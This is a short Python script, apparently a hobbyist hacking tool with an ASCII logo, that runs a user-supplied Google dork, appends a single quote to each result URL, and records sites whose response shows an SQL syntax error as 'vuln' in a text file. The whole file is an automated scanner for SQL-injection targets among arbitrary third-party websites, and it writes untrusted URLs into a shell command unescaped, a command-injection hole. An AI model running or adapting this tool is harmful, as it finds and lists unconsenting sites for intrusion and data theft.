from os import system
Green = "\33[0;32m"
GreenLight = "\33[32;1m"
Blue = "\33[0;36m"
BlueLight = "\33[36;1m"
Red = "\33[31;1m"
White = "\33[37;1m"
black = "\33[30;1m"
Yellow = "\33[33;1m"
YellowLight = "\33[1;33m"
logo="""
  ______                    __      _______         
 |   _  \   .-----. .----. |  |--. |   _   | .-----.
 |.  |   \  |  _  | |   _| |    <  |___|   | |__ --|
 |.  |    \ |_____| |__|   |__|__|  /  ___/  |_____|
 |:  1    /                        |:  1  \         
 |::.. . /                         |::.. . |        
 `------'                          `-------'        
"""
try:
    from googlesearch import search
    import requests
except ModuleNotFoundError:
    system('pip install google')
    system('pip install requests')
try:
    system('clear')
    print(Red+logo)
    print(YellowLight+'Author     : '+White+'HadsXdevPy')
    print(YellowLight+'Thanks To  : '+White+'Haz3ll and Xn5')
    print(YellowLight+'Version    : '+White+'3.4')
    print()
    dork=input(Red+'['+Blue+'+'+Red+']'+YellowLight+' your dork :'+White+' ')
    payload="'"
    for url in search(dork):
        req=requests.get(url+payload)
        if 'syntax;' in req.text:
            print(Blue+'['+GreenLight+'✓'+Blue+']'+GreenLight+' vuln :',url)
            system('echo '+url+' >> vuln.txt')
        else:
            print(Red+'[x] not vuln :',url)
except KeyboardInterrupt:
    print(Red+'Abort By You')
